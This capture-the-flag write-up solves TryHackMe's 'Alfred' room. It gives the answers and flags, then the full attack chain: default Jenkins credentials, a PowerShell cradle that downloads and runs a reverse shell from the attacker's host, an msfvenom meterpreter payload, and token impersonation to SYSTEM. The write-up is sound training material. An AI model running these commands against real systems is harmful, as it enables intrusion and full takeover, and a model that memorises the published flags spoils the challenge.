# Alfred

## Task 1  Initial Access
+ How many ports are open? (TCP only)`3`
+ What is the username and password for the login panel? (in the format username:password)`admin:admin`
+ What is the user.txt flag? `79007a09481963edf2e1321abd9ae2a0`

## Task 2  Switching Shells
+ What is the final size of the exe payload that you generated?`73802`

## Task 3  Privilege Escalation
+ View all the privileges using whoami /priv `No Answer Needed`
+ Enter: load incognito to load the incognito module in Metasploit. Please note that you may need to use the use incognito command if the previous command doesn't work. Also, ensure that your Metasploit is up to date.`No Answer Needed`
+ Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. What is the output when you run the getuid command?`NT AUTHORITY\SYSTEM`
+ Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the services.exe process. First, use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS `No Answer Needed`
+ Read the root.txt file located at C:\Windows\System32\config `��dff0f748678f280250f25a45b8046b4a`


### Looting 
- email `alfred@wayneenterprises.com`
- `Invoke-PowerShellTcp.ps1` download from github repository

### Enumeration 
- Nmap scan
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 00:24 WIB
Nmap scan report for 10.10.219.22
Host is up (0.37s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ms-wbt-server
|_ssl-date: 2024-01-22T17:30:12+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2024-01-21T17:21:43
|_Not valid after:  2024-07-22T17:21:43
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2024-01-22T17:30:13+00:00
8080/tcp open  http-proxy
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/

Nmap done: 1 IP address (1 host up) scanned in 354.83 seconds
```

+ Set Command to publish our revershell TCP so victim can download and execute the command from build
```bash
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.4.37.160:81/Invoke-PowerShellTcp.ps1')" ; Invoke-PowerShellTcp -Reverse -IPAddress 10.4.37.160 -Port 4444

┌──(kali㉿kali)-[~/TryHackMe/alfred]
└─$ nc -lvp 4444
listening on [any] 4444 ...
10.10.219.22: inverse host lookup failed: Unknown host
connect to [10.4.37.160] from (UNKNOWN) [10.10.219.22] 49240
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce
PS C:\Program Files (x86)\Jenkins\workspace\project> cd ../../../
PS C:\Program Files (x86)> cd ..
PS C:\> cd Users
PS C:\Users> cd bruce
PS C:\Users\bruce> cd Desktop
PS C:\Users\bruce\Desktop> dir 


    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  11:22 PM         32 user.txt                          


PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```
+ Change the shell using meterpreter generate our payload using `msfvenom`
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.37.160 LPORT=1337 -f exe -o dodol.exe

┌──(kali㉿kali)-[~/TryHackMe/alfred]
└─$msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.37.160 LPORT=1337 -f exe -o dodol.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: dodol.exe
```
+ Upload the payload to the server from previous shell
```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.37.160:81/dodol.exe','dodol.exe')"
```
+ Prepare for metasploit to get meterpreter sessions
```bash
msf6 > use exploit/multi/handler                                                                   
[*] Using configured payload generic shell_reverse_tcp      
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf6 exploit(multi/handler) > run

meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > getuid
Server username: alfred\bruce

meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
+ Migrate our sessions to persisten services
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                Arch  Session  User                          Path
 ---   ----  ----                ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System              x64   0
 396   4     smss.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 524   516   csrss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 540   1812  cmd.exe             x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 572   564   csrss.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 772   668   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 848   668   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 916   668   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 920   608   LogonUI.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 936   668   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 988   668   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1012  668   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1064  668   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1208  668   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1236  668   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1340  668   amazon-ssm-agent.e  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ss
             xe                                                               m-agent.exe
 1424  668   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1460  668   LiteAgent.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\Lite
                                                                              Agent.exe
 1488  668   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1604  524   conhost.exe         x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 1616  668   jenkins.exe         x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkin
                                                                              s.exe
 1704  668   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1776  668   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1812  1616  java.exe            x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bi
                                                                              n\java.exe
 1824  668   Ec2Config.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigServ
                                                                              ice\Ec2Config.exe
 1928  524   conhost.exe         x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 1996  540   powershell.exe      x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell
                                                                              \v1.0\powershell.exe
 2068  1996  dodol.exe           x86   0        alfred\bruce                  C:\Users\bruce\Desktop\dodol.exe
 2348  772   WmiPrvSE.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2760  668   SearchIndexer.exe   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2960  668   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3012  668   TrustedInstaller.e  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller
             xe                                                               .exe
 3052  668   sppsvc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe


meterpreter > migrate 668
[*] Migrating from 2068 to 668...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > pwd
C:\Windows\system32\config
meterpreter > cat root.txt
��dff0f748678f280250f25a45b8046b4a

```
